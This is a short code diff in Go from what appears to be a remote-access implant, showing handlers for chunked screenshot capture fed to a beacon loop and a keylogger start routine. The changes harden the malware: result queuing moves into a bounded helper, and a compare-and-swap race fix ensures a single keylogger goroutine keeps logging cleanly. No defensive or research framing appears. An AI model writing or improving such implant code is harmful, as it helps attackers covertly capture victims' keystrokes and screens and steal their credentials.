@@ -34,10 +34,8 @@ func handleScreenshot(task Task, res *TaskResult) {
 		return
 	}
 	// Multi-chunk: append chunks to pendingResults. The beacon loop and the
-	// task worker both touch pendingResults, so take the lock here.
-	pendingMu.Lock()
-	pendingResults = append(pendingResults, results...)
-	pendingMu.Unlock()
+	// task worker both touch pendingResults through the bounded enqueue helper.
+	enqueueResults(results)
 	res.Output = "screenshot_chunked"
 	res.Size = int64(len(results))
 	inFastMode.Store(true)
@@ -112,9 +110,7 @@ func handleScreenshotWindow(task Task, res *TaskResult) {
 		res.Size = results[0].Size
 		return
 	}
-	pendingMu.Lock()
-	pendingResults = append(pendingResults, results...)
-	pendingMu.Unlock()
+	enqueueResults(results)
 	res.Output = "screenshot_chunked"
 	res.Size = int64(len(results))
 }
@@ -122,8 +118,10 @@ func handleScreenshotWindow(task Task, res *TaskResult) {
 // ── Keylogger ───────────────────────────────────────────────────────────
 
 func handleKeyloggerStart(task Task, res *TaskResult) {
-	if atomic.LoadInt32(&keylogActive) == 0 {
-		atomic.StoreInt32(&keylogActive, 1)
+	// Compare-and-swap atomically claims the single active keylogger slot, so a
+	// second start (or a start racing a still-exiting loop) cannot launch a
+	// duplicate goroutine that would double-log and corrupt the buffer.
+	if atomic.CompareAndSwapInt32(&keylogActive, 0, 1) {
 		go keyloggerLoop()
 	}
 	res.Output = "keylogger started"
